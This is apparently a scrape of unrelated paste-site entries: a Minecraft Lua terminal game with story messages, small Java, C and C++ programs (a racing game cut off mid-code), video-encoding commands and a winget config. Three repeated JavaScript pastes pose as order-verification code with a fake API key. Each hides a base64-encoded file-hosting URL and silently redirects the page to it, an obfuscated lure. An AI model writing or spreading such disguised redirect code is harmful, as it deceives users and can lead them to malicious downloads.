    print(""[3] ︱ [Lab 1] Missing Shipment ︱"")
	print(""[4] ︱ [Lab 2] Lab results ︱"")
	print(""[5] ︱ [Omega] Iris installed ︱"")
	print(""[6] ︱ [High cmd] Increased activity READ ME︱"")
	print(""[7] ︱ [Lab 2] Eggsacks ︱"")
	print(""︱OLDEST︱"")
	print("""")
	print("""")
	print(""[E] Exit"")
	local answer = io.read()
	if answer == ""1"" then
		term.clear()
		print(""︱ [Omega] ComE ︱"")
		print("""")
		print(""Join us, we lvie in hramony, the msnoetrs are gone, we cannot aecscc your wold,"")
		print(""you will cmoe to ouesr, cmoe cmoe, Alvin missse you all"")
		print("""")
		print(""Unknown entity, Omega Site"")
		print("""")
		print("""")
		print(""[E] Exit"")
		local answer = io.read()
		goto continue1
	elseif answer == ""2"" then
		term.clear()
		print(""︱ [ALERT] LOCKDOWN INITIATED ︱"")
		print("""")
		print(""THIS IS NOT A DRILL, THIS IS NOT A DRILL, THIS IS NOT A DRILL"")
		print(""ALL SITES, COMMENCE Decontamination Procedure, COMMENCE LOCKDOWN."")
		print(""READ REST OF MESSAGE WHEN COMPLETE!"")
		print("""")
		print(""Omega site is unavailable, no one is answering. Lab 2 is the same."")
		print(""Alpha site received a wormhole from Omega site but no one got through!."")
		print(""We cannot reach them since High Command is also unavailable."")
		print(""I have ordered an ALERT on all channels as proper procedure."")
		print(""PLEASE RESPOND IF YOU ARE READING THIS!."")
		print(""We also have a power problem at Alpha site, today we were supposed to receive a new ZPM."")
		print(""At limited usage we should be good for another month, but after that we need to evacuate."")
		print(""Since High Command is not available we cannot use our stargate, the Iris code is encrypted."")
		print(""RESPOND IMMEDIATELY if receiving this message!."")
		print("""")
		print(""Rosewood, Head of Security, Alpha Site"")
		print("""")
		print("""")
		print(""[E] Exit"")		
		local answer = io.read()
		goto continue1
	elseif answer == ""3"" then
		term.clear()
		print(""︱ [Lab 1] Missing Shipment ︱"")
		print("""")
		print(""Im reaching you since i cant get a hold of Lab 2 myself, my security clearence isnt that high."")
		print(""We were supposed to receive a shipment today but it never came. It was supposed to be delivered through the gate."")
		print(""It does not say what it even is, so you can imagine my frustration."")
		print(""Let me know if you find it, i will report this incident to my higher ups, you should report it to High Command."")
		print("""")
		print(""Jack, Shipment officer, Lab 1"")
		print("""")
		print("""")
		print(""[E] Exit"")
		local answer = io.read()
		goto continue1
	elseif answer == ""4"" then
		term.clear()
		print(""︱ [Lab 2] Lab results ︱"")
		print("""")
		print(""We have dubbed it Alvin, from alvin and the chipmunks!"")
		print(""Alvin has exceeded our expectations, he (or it rather) is a perfect creature. Able to adapt and reform his body at will."")
		print(""We have feeded it live chipmunks and it immediately assumed its form as one! Before devouring them."")
		print(""It has now grown, its the size of a human. Although i doubt it has the intelligence of one."")
		print(""It also has this weird effect on life around it, it kinda dies, and reanimates into something different."")
		print(""We had to increase the security zone around its holding area, my plants were dying because of it."")
		print(""We will need to move it in the near future, to a more secure facility."")
		print(""I hear Lab 1 is getting a 20 billion dollar funding this year, lucky them."")
		print(""Let High Command know i will be terminating the rest of the eggs also, they have begun to smell."")
		print(""Oh and that Lab 1 can take care of Alvin."")
		print("""")
		print(""Doctor Greywall, Lab 2"")
		print("""")
		print("""")
		print(""[E] Exit"")		
		local answer = io.read()
		goto continue1
	elseif answer == ""5"" then
		term.clear()
		print(""︱ [Omega] Iris installed ︱"")
		print("""")
		print(""As per requested the Iris is now operational, although we are abit sceptical that the code is classified."")
		print(""What if the settlers have family to visit?"")
		print(""Also it will become harder to receive supply, High command needs to approve everytime so they can shutdown the Iris!"")
		print(""Please forward these issues to High Command, its important for us."")
		print(""We have also been seeing thing here, things in the dark. Im not the only one."")
		print(""David saw a GIANT spider yesterday, looked like it could eat a cat!."")
		print("""")
		print(""Bryan Haddoc, Omega Site"")	
		print("""")
		print("""")
		print(""[E] Exit"")
		local answer = io.read()
		goto continue1
	elseif answer == ""6"" then
		term.clear()
		print(""︱ [High cmd] Increased activity READ ME︱"")
		print("""")
		print(""High Command has finished its assessment around the Omega site, new security measures are to be taken."")
		print(""The local fauna has been increasing its hostility towards the site, where as before it was only curious of us, it is now our belief it has grown more hostile."")
		print(""No doubt due to the experiments from Doctor Greywall in Lab 2."")
		print(""An Iris to the gate at Omega site is to be installed at once! New intel suggests that there is currently a large scale operation"")
		print(""underway intended to sabotage the site, possibly even a takeover. Secure the gate, then take care of the wildlife surrounding the Omega site."")
		print(""We dont want any surprises. Make sure that the Iris gate code is ONLY known by High Command."")
		print("""")
		print(""The settlements beyond Omega is also now at greater risk."")
		print(""Until we have a greater understanding of the local fauna, NO personnel is allowed to leave the Omega site."")
		print(""The settlers can protect themselves, they are all armed after all."")
		print("""")
		print(""Secretary General Coldwell, HC"")	
		print("""")
		print("""")
		print(""[E] Exit"")		
		local answer = io.read()
		goto continue1
	elseif answer == ""7"" then
		term.clear()
		print(""︱ [Lab 2] Eggsacks ︱"")
		print("""")
		print(""The eggsacks found on the planet nibiru have produced results."")
		print(""We have managed to create a hybrid of a vein floater along with local fauna found on the Omega site."")
		print(""So far it has adapted to everything we have thrown at it,"")
		print(""Lava, shotguns, electrocutions, it seems to handle it all."")
		print(""The staff is beginning to wonder what we should do if it breaks out."")
		print(""Not to worry, the lab is set to blow with a 100 Megaton warhead if it does, but i wont tell them that."")
		print(""Also it has begun laying eggs on its own, expect more results sooner now rather than later."")
		print("""")
		print(""Doctor Greywall, Lab 2"")	
		print("""")
		print("""")
		print(""[E] Exit"")	
		local answer = io.read()
		goto continue1
	elseif answer == ""e"" or answer == ""E"" then
	
	else 
		goto continue1
	end
end

-- Function to send messages
local function send_message()
	::continue1::
	term.clear()
	print(""Pick receiver"")
	print(""[1] Epsilon Site"")
    print(""[2] Laboratory 1"")
	print(""[3] Laboratory 2"")
    print(""[4] Omega Site"")
	print(""[E] Exit"")
	local answer = io.read()
	if answer == ""1"" then
		send_to = ""Epsilon Site""
		print(""Epsilon Site Confirmed, please type the subject of your message and press enter"")
		print("""")
		local header = io.read()
		term.clear()
		print(""Subject: "" .. header)
		print("""")
		print(""Please type your message"")
		print("""")
		local message = io.read()
		term.clear()
		print(""From: "" .. Local_Name)
		print(""Subject: "" .. header)
		print(""Message: "" .. message)
		print("""")
		print(""Do you want to send this message to "".. send_to""?"")
		print(""Y/n"")
		local answer = io.read()
		if answer == ""Y"" or answer == ""y"" then
			send_command(send_to, message, header)
		end
		term.clear()
		goto continue1
	elseif answer == ""2"" then
		send_to = ""Laboratory 1""
		term.clear()
		print(""Laboratory 1 Confirmed, please type the subject of your message and press enter"")
		print("""")
		local header = io.read()
		term.clear()
		print(""Subject: "" .. header)
		print("""")
		print(""Please type your message"")
		print("""")
		local message = io.read()
		term.clear()
		print(""From: "" .. Local_Name)
		print(""Subject: "" .. header)
		print(""Message: "" .. message)
		print("""")
		print(""Do you want to send this message to "".. send_to""?"")
		print(""Y/n"")
		local answer = io.read()
		if answer == ""Y"" or answer == ""y"" then
			send_command(send_to, message, header)
		end
		term.clear()
		goto continue1
	elseif answer == ""3"" then
		send_to = ""Laboratory 2""
		term.clear()
		print(""Laboratory 2 Confirmed, please type the subject of your message and press enter"")
		print("""")
		local header = io.read()
		term.clear()
		print(""Subject: "" .. header)
		print("""")
		print(""Please type your message"")
		print("""")
		local message = io.read()
		term.clear()
		print(""From: "" .. Local_Name)
		print(""Subject: "" .. header)
		print(""Message: "" .. message)
		print("""")
		print(""Do you want to send this message to "".. send_to""?"")
		print(""Y/n"")
		local answer = io.read()
		if answer == ""Y"" or answer == ""y"" then
			send_command(send_to, message, header)
		end
		term.clear()
		goto continue1
	elseif answer == ""4"" then
		send_to = ""Omega Site""
		term.clear()
		print(""Omega Site Confirmed, please type the subject of your message and press enter."")
		print("""")
		local header = io.read()
		term.clear()
		print(""Subject: "" .. header)
		print("""")
		print(""Please type your message"")
		print("""")
		local message = io.read()
		term.clear()
		print(""From: "" .. Local_Name)
		print(""Subject: "" .. header)
		print(""Message: "" .. message)
		print("""")
		print(""Do you want to send this message to "".. send_to""?"")
		print(""Y/n"")
		local answer = io.read()
		if answer == ""Y"" or answer == ""y"" then
			send_command(send_to, message, header)
		end
		term.clear()
		goto continue1
	elseif answer == ""e"" or answer == ""E"" then
	
	else 
		goto continue1
	end
end
local function handle_modem_message(_, _, from, port, _, message, data)
    if port == 123 or port == 0 then
        if message == ""error"" then
			print("""")
			print(""[ERROR] "" .. data)
		elseif message == ""sent_message"" then
			print(""Sent message to "" .. data)
		elseif message == ""new_message"" then
			local message_data = serialization.unserialize(data)
			if message_data.timestamp ~= lastMessageId then
				lastMessageId = message_data.timestamp
				print("""")
				print(""New message received from "" .. message_data.from)
				print(""Subject: "" .. message_data.shrt .. message_data.header)
				print(""Message: "" .. message_data.message)
				print(""User: "" .. message_data.user)
			end
		end
	end
end
-- Keyboard Input Listener
local function key_listener(_, _, char, code, playerName)
    local key = string.char(char)
	user = playerName
	event.ignore(""key_down"", key_listener)
    if key == ""u"" then
			term.clear()
			print(""Connecting to central network..."")
			os.sleep(3)
			print(""[ERROR] No connection"")
			os.sleep(0.5)
			print(""[ERROR] Diagnosing..."")
			os.sleep(3)
			print(""[ERROR] Receiver [OFFLINE]"")
			print(""[✔] Transmitter [ONLINE]"")
			print(""[⚠] Can not receive orders/messages"")
			print(""[⚠] ONLY Transmit!"")
			print("""")
			print(""Please follow standard Emergency Procedures"")
			os.sleep(8)
			draw_ui()
    elseif key == ""d"" then
			if decon then
				print(""Cannot stop Decontamination Procedure"")
			elseif not decon then
				decon = not decon
				draw_ui()
				debug_card.runCommand(""/effect @e[x=15019,y=40,z=12603,dx=57,dy=13,dz=57] minecraft:poison 10 3"")
				os.sleep(10)
				decon = not decon
				draw_ui()
				print(""Decontamination Procedure Complete!"")
			end
    elseif key == ""q"" then
			reds.setBundledOutput(sides.bottom, colors.black, 255)
			draw_ui()
			print("""")
			print(""Dialing Omega Site!"")
			os.sleep(2)
			reds.setBundledOutput(sides.bottom, colors.black, 0)
    elseif code == 57 then
		if beacon then
			print(""Confirm Beacon Shutdown"")
			print(""Y/n"")
			local answer = io.read()
			if answer == ""y"" or answer == ""Y"" then
				beacon = not beacon
				print(""Confirmed"")
				os.sleep(3)
				draw_ui()
			else
				print(""Aborted!"")
				os.sleep(3)
				draw_ui()
			end
		elseif not beacon then
			beacon = not beacon
			draw_ui()
			print(""Emergency Beacon Online!"")
			
		end
	elseif key == ""m"" then
		::continue::
		draw_ui_messages()
		local answer = io.read()
		if answer == ""r"" or answer == ""R"" then
			read_message()
			goto continue
		elseif answer == ""s"" or answer == ""S"" then
			send_message()
			goto continue
		elseif answer == ""e"" or answer == ""E"" then
			draw_ui()
		else
			goto continue
		end
    end
	event.listen(""key_down"", key_listener)
end
draw_ui()
messages = event.listen(""modem_message"", handle_modem_message)
event.listen(""key_down"", key_listener)

while running do
	os.sleep(0.5)
end

os.sleep(1)
os.exit()"
860RtJ7V,Untitled,RJNewbyte,Java,Monday 31st of March 2025 09:42:54 AM CDT,"public class UserHomeExample {
    public static void main(String[] args) {
        // Using System.getProperty to get the user's home directory (JVM property)
        String userHome = System.getProperty(""user.home"");
        System.out.println(""User Home (via getProperty): "" + userHome);

        // Using System.getenv to get the HOME environment variable (OS-level)
        String homeEnv = System.getenv(""HOME"");
        System.out.println(""Home Env (via getenv): "" + homeEnv);

        // Using System.getenv to get USERPROFILE (common in Windows)
        String userProfile = System.getenv(""USERPROFILE"");
        System.out.println(""User Profile (via getenv): "" + userProfile);
    }
}"
xqLrGL9K,Market.js,dentira,JavaScript,Monday 31st of March 2025 09:38:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/067/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BCwQuhKi,Working With VVC Codec,osiristua909,Bash,Monday 31st of March 2025 09:10:59 AM CDT,"./ffmpeg -v error -i input.webm -an -f yuv4mpegpipe -strict -1 - | ./uvg266 -i - --input-file-format y4m --qp 25 --preset medium --threads 4 -o input.vvc

./ffmpeg -v error -i input.mkv -an -f yuv4mpegpipe -strict -1 - | ./uvg266 -i - --input-file-format y4m --qp 25 --preset medium --threads 4 -o input.vvc

./ffmpeg -v error -i input.mp4 -an -f yuv4mpegpipe -strict -1 - | ./uvg266 -i - --input-file-format y4m --qp 25 --preset medium --threads 4 -o input.vvc

exhale 3 input.wav output.m4a

exhale 5 input.wav output.m4a

exhale 9 input.wav output.m4a

./MP4Box -add input.vvc -add output.m4a -new output.mp4
"
kzY2GLc3,Products.js,dentira,JavaScript,Monday 31st of March 2025 09:07:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/105/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jb7jdR8B,Order.js,dentira,JavaScript,Monday 31st of March 2025 08:52:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/661/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dUeeL3xb,winget settings.json,RetroRevo,JSON,Monday 31st of March 2025 08:48:08 AM CDT,"{
    ""$schema"": ""https://aka.ms/winget-settings.schema.json"",

    // For documentation on these settings, see: https://aka.ms/winget-settings
    // ""source"": {
    //    ""autoUpdateIntervalInMinutes"": 5
    // },
    ""visual"": {
	    ""progressBar"": ""rainbow""
    },
    ""telemetry"": {
	    ""disable"": true
    }
}"
VxazvWEw,Market.js,dentira,JavaScript,Monday 31st of March 2025 08:36:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/739/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yBCda0Cw,while 31-3-25,Aluneth,C,Monday 31st of March 2025 08:30:46 AM CDT,"// Estructura repetitiva while (mientras)

#include <stdio.h>
#include <stdlib.h>

/* int main()
{
    int numero = 1;
    while (numero <= 100)
    {
        printf(""- %d \n"", numero);
        numero = numero +1;
    }
    //printf(""Hello world!\n"");
    return 0;
} */


/* int main ()
{
    int x, n;
    x = 1;
    printf(""Ingrese un numero: "");
    scanf(""%d"", &n);

    while (x<=n)
    {

        printf(""- %d\n"", x);
        x = x+1;

    }

    return 0;
} */

int main () {}
"
sfiw3dx0,2D Car Racing (Text Rendering Glitch (Missing Character) Fixed!!) *FINAL VER 4*,alien_fx_fiend,C++,Monday 31st of March 2025 08:20:02 AM CDT,"==++ Here's the full code for (file 1/1) ""RaceCar.cpp""::: ++==
```RaceCar.cpp
#include <Windows.h>
#include <ctime>
#include <cstdlib>
#include <math.h>
#include <stdio.h>
#include <string>
#include ""resource.h""  // Add this with your other includes

// Global Variables
const int WIDTH = 1366;
const int HEIGHT = 768;
const int ROAD_WIDTH = 200;
const int CAR_WIDTH = 50;
const int CAR_HEIGHT = 100;
const int TYRE_SIZE = 10;
const int FPS = 60;
const int TIMER = 4;
const int TURN_RADIUS = 5;
const double PI = 3.14159265358979323846;
const double M_PI = 3.14159265358979323846;

int playerX = 100;
int playerY = HEIGHT - CAR_HEIGHT - 50;
int playerSpeedX = 0;
int playerSpeedY = 0;
int aiX = playerX + CAR_WIDTH + 20;
int aiY = playerY;
float aiAngle = -PI / 2;  // Add this line
int aiSpeedX = 0;
int aiSpeedY = 0;
int speed = 5;
int aiSpeed = 5;
int timer = TIMER;
int playerTyre1X = playerX + 10;
int playerTyre1Y = playerY + CAR_HEIGHT - TYRE_SIZE;
int playerTyre2X = playerX + CAR_WIDTH - TYRE_SIZE - 10;
int playerTyre2Y = playerY + CAR_HEIGHT - TYRE_SIZE;
int aiTyre1X = aiX + 10;
int aiTyre1Y = aiY + CAR_HEIGHT - TYRE_SIZE;
int aiTyre2X = aiX + CAR_WIDTH - TYRE_SIZE - 10;
int aiTyre2Y = aiY + CAR_HEIGHT - TYRE_SIZE;
float playerAngle = -PI / 2;  // Initialize to face North by default
//float playerAngle = 0.0f;

bool gameStarted = false;
bool gameOver = false;
bool playerWon = false;
bool godMode = true;
//int timer = 30 * 10; // 30 seconds * 10 (timer resolution)

// Window Procedure
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_CREATE:
        SetTimer(hWnd, 1, 1000 / FPS, NULL);
        break;
    case WM_TIMER:
        if (timer > 0)
        {
            timer--;
            InvalidateRect(hWnd, NULL, FALSE);
        }
        else if (!gameStarted)
        {
            gameStarted = true;
            srand((unsigned int)time(0));
            aiSpeed = rand() % 5 + 3;

            // Set initial positions for both cars on the lower left road, facing up
            playerX = ROAD_WIDTH / 2 - CAR_WIDTH / 2;
            playerY = HEIGHT - CAR_HEIGHT - 20;
            //playerAngle = -PI / 2; // -90 degrees, pointing straight up
            playerAngle = 0; // 0 degrees, pointing straight up (north)

            aiX = ROAD_WIDTH / 2 - CAR_WIDTH / 2;
            aiY = HEIGHT - CAR_HEIGHT - 100;
            //aiAngle = -PI / 2; // -90 degrees, pointing north
            aiAngle = 0; // 0 degrees, pointing north
        }
        else if (!gameOver)
        {
            // Add God Mode toggle
            if (GetAsyncKeyState('G') & 1) // Check if G key was just pressed
            {
                godMode = !godMode;
            }

            // Store previous position for collision recovery
            float prevPlayerX = playerX;
            float prevPlayerY = playerY;
            float prevPlayerAngle = playerAngle;

            // Player car controls
            if (GetAsyncKeyState(VK_LEFT))
            {
                if (GetAsyncKeyState(VK_DOWN))
                    playerAngle += 0.05f; // Reverse turning
                else
                    playerAngle -= 0.05f; // Forward turning
            }
            if (GetAsyncKeyState(VK_RIGHT))
            {
                if (GetAsyncKeyState(VK_DOWN))
                    playerAngle -= 0.05f; // Reverse turning
                else
                    playerAngle += 0.05f; // Forward turning
            }

            // Forward/Backward movement in the direction the car is facing
            if (GetAsyncKeyState(VK_UP))
            {
                // Move forward in the direction of playerAngle
                playerX += sin(playerAngle) * speed;
                playerY -= cos(playerAngle) * speed;
            }
            if (GetAsyncKeyState(VK_DOWN))
            {
                // Move backward in the opposite direction of playerAngle
                playerX -= sin(playerAngle) * speed;
                playerY += cos(playerAngle) * speed;
            }

            // Update player headlights position based on car angle
            playerTyre1X = playerX + 10;
            playerTyre1Y = playerY + 5;
            playerTyre2X = playerX + CAR_WIDTH - TYRE_SIZE - 10;
            playerTyre2Y = playerY + 5;

            // Road collision detection for player
            bool onRoad = false;
            // Vertical road
            if (playerX >= 0 && playerX <= ROAD_WIDTH - CAR_WIDTH)
                onRoad = true;
            // Horizontal road at top (twice as tall)
            if (playerY >= 0 && playerY <= (ROAD_WIDTH * 2) &&
                playerX >= 0 && playerX <= WIDTH - CAR_WIDTH)
                onRoad = true;

            if (!onRoad && !godMode) // Only restrict movement if god mode is off
            {
                // Return to previous position if off road
                playerX = prevPlayerX;
                playerY = prevPlayerY;
                playerAngle = prevPlayerAngle;
            }

            // AI car movement logic
            if (aiY > ROAD_WIDTH * 2 && aiX < ROAD_WIDTH / 2)
            {
                aiSpeedX = 0;
                aiSpeedY = -aiSpeed;
                aiAngle = 0;  // Facing upward
            }
            else if (aiY <= ROAD_WIDTH * 2 && aiX < WIDTH - ROAD_WIDTH)
            {
                aiSpeedX = aiSpeed;
                aiSpeedY = 0;
                aiAngle = -PI / 2;  // Facing right
            }
            else if (aiX >= WIDTH - ROAD_WIDTH && aiY <= HEIGHT - ROAD_WIDTH)
            {
                aiSpeedX = 0;
                aiSpeedY = aiSpeed;
                aiAngle = PI;  // Facing downward
            }
            else if (aiX > ROAD_WIDTH && aiY >= HEIGHT - ROAD_WIDTH)
            {
                aiSpeedX = -aiSpeed;
                aiSpeedY = 0;
                aiAngle = PI / 2;  // Facing left
            }

            // AI Car Movement and Headlight Update
            aiX += aiSpeedX;
            aiY += aiSpeedY;

            // Calculate the front of the car using its angle
            float headlightDistance = CAR_HEIGHT / 2 - 10;

            // Calculate headlight positions based on the car's angle
            float headlightOffsetX = cos(aiAngle) * headlightDistance;
            float headlightOffsetY = sin(aiAngle) * headlightDistance;

            // Set AI headlights at the front of the car
            //aiTyre1X = aiX + CAR_WIDTH / 4 + headlightOffsetX;
            //aiTyre1Y = aiY + headlightOffsetY;
            //aiTyre2X = aiX - CAR_WIDTH / 4 + headlightOffsetX;
            //aiTyre2Y = aiY + headlightOffsetY;

            // Collision detection between player and AI cars            
            // Define the corners of the player car
            int playerCorner1X = playerX;
            int playerCorner1Y = playerY;
            int playerCorner2X = playerX + CAR_WIDTH;
            int playerCorner2Y = playerY;
            int playerCorner3X = playerX + CAR_WIDTH;
            int playerCorner3Y = playerY + CAR_HEIGHT;
            int playerCorner4X = playerX;
            int playerCorner4Y = playerY + CAR_HEIGHT;

            // Define the corners of the AI car
            int aiCorner1X = aiX;
            int aiCorner1Y = aiY;
            int aiCorner2X = aiX + CAR_WIDTH;
            int aiCorner2Y = aiY;
            int aiCorner3X = aiX + CAR_WIDTH;
            int aiCorner3Y = aiY + CAR_HEIGHT;
            int aiCorner4X = aiX;
            int aiCorner4Y = aiY + CAR_HEIGHT;

            // Check if the player car is too close to the opponent car from behind
            if (!godMode && playerY + CAR_HEIGHT > aiY &&
                playerY < aiY + CAR_HEIGHT &&
                playerX + CAR_WIDTH > aiX &&
                playerX < aiX + CAR_WIDTH)
            {
                // Prevent the player car from moving forward
                if (GetAsyncKeyState(VK_UP))
                {
                    playerX -= sin(playerAngle) * speed;
                    playerY += cos(playerAngle) * speed;
                }
            }

            // Check if any of the player car's corners are inside the AI car
            if (!godMode && ((playerCorner1X > aiCorner1X && playerCorner1X < aiCorner3X &&
                playerCorner1Y > aiCorner1Y && playerCorner1Y < aiCorner3Y) ||
                (playerCorner2X > aiCorner1X && playerCorner2X < aiCorner3X &&
                    playerCorner2Y > aiCorner1Y && playerCorner2Y < aiCorner3Y) ||
                (playerCorner3X > aiCorner1X && playerCorner3X < aiCorner3X &&
                    playerCorner3Y > aiCorner1Y && playerCorner3Y < aiCorner3Y) ||
                (playerCorner4X > aiCorner1X && playerCorner4X < aiCorner3X &&
                    playerCorner4Y > aiCorner1Y && playerCorner4Y < aiCorner3Y) ||
                // Check if any of the AI car's corners are inside the player car
                (aiCorner1X > playerCorner1X && aiCorner1X < playerCorner3X &&
                    aiCorner1Y > playerCorner1Y && aiCorner1Y < playerCorner3Y) ||
                (aiCorner2X > playerCorner1X && aiCorner2X < playerCorner3X &&
                    aiCorner2Y > playerCorner1Y && aiCorner2Y < playerCorner3Y) ||
                (aiCorner3X > playerCorner1X && aiCorner3X < playerCorner3X &&
                    aiCorner3Y > playerCorner1Y && aiCorner3Y < playerCorner3Y) ||
                (aiCorner4X > playerCorner1X && aiCorner4X < playerCorner3X &&
                    aiCorner4Y > playerCorner1Y && aiCorner4Y < playerCorner3Y)))
            {
                // Move the player car back to prevent collision
                if (GetAsyncKeyState(VK_UP))
                {
                    playerX -= sin(playerAngle) * speed;
                    playerY += cos(playerAngle) * speed;
                }
                if (GetAsyncKeyState(VK_DOWN))
                {
                    playerX += sin(playerAngle) * speed;
                    playerY -= cos(playerAngle) * speed;
                }

                // Move the AI car back to prevent collision
                aiX -= aiSpeedX;
                aiY -= aiSpeedY;
            }

            /* Victory conditions commented out
            if (playerX > WIDTH - ROAD_WIDTH - CAR_WIDTH && playerY < ROAD_WIDTH)
            {
                gameOver = true;
                playerWon = true;
            }
            if (aiX > WIDTH - ROAD_WIDTH - CAR_WIDTH && aiY < Road_WIDTH)
            {
                gameOver = true;
                playerWon = false;
            }
            */

            InvalidateRect(hWnd, NULL, FALSE);
        }
        break;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);

        // Create memory DC and bitmap for double buffering
        HDC memDC = CreateCompatibleDC(hdc);
        HBITMAP memBitmap = CreateCompatibleBitmap(hdc, WIDTH, HEIGHT);
        HBITMAP oldBitmap = (HBITMAP)SelectObject(memDC, memBitmap);

        // Clear background
        HBRUSH lightGreenBrush = CreateSolidBrush(RGB(144, 238, 144)); // Light green color
        RECT rect = { 0, 0, WIDTH, HEIGHT };
        FillRect(memDC, &rect, lightGreenBrush);
        DeleteObject(lightGreenBrush);

        // Draw roads (black rectangles)
        HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
        // Vertical road
        RECT verticalRoad = { 0, 0, ROAD_WIDTH, HEIGHT };
        FillRect(memDC, &verticalRoad, blackBrush);
        // Horizontal road (twice as tall)
        RECT horizontalRoad = { 0, 0, WIDTH, ROAD_WIDTH * 2 };
        FillRect(memDC, &horizontalRoad, blackBrush);
        DeleteObject(blackBrush);

        // Draw yellow road strips
        HBRUSH yellowBrush = CreateSolidBrush(RGB(255, 255, 0));
        SelectObject(memDC, yellowBrush);
        // Vertical road strips
        for (int y = 0; y < HEIGHT; y += 80) {
            Rectangle(memDC, ROAD_WIDTH / 2 - 5, y, ROAD_WIDTH / 2 + 5, y + 40);
        }
        // Horizontal road strips
        for (int x = 0; x < WIDTH; x += 80) {
            Rectangle(memDC, x, ROAD_WIDTH - 5, x + 40, ROAD_WIDTH + 5);
        }
        DeleteObject(yellowBrush);

        // Drawing Player's Car and Headlights
        HBRUSH redBrush = CreateSolidBrush(RGB(255, 0, 0));
        SelectObject(memDC, redBrush);
        int savedDC = SaveDC(memDC);
        XFORM xform;
        SetGraphicsMode(memDC, GM_ADVANCED);
        xform.eM11 = (FLOAT)cos(playerAngle);
        xform.eM12 = (FLOAT)sin(playerAngle);
        xform.eM21 = (FLOAT)-sin(playerAngle);
        xform.eM22 = (FLOAT)cos(playerAngle);
        xform.eDx = (FLOAT)playerX + CAR_WIDTH / 2;
        xform.eDy = (FLOAT)playerY + CAR_HEIGHT / 2;
        SetWorldTransform(memDC, &xform);
        Rectangle(memDC, -CAR_WIDTH / 2, -CAR_HEIGHT / 2, CAR_WIDTH / 2, CAR_HEIGHT / 2);

        HBRUSH headlightBrush = CreateSolidBrush(RGB(255, 255, 255));
        SelectObject(memDC, headlightBrush);
